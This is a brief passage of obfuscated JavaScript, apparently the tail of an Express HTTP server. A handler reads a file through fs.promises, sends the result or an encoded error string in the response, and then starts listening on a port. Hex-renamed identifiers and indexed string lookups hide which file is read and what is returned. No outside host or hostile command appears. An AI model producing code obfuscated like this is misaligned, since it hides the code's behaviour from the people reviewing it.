fs['promises'][_0x1cfa35(0x283)](_0x5b3bd7,_0x1cfa35(0x29c));_0x57dae8[_0x1cfa35(0x277)](_0x226ca9);}catch(_0x3e63d6){_0x57dae8[_0x1cfa35(0x277)](_0x1cfa35(0x27a));}}),app[_0x8a7352(0x26b)](PORT,()=>console[_0x8a7352(0x285)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));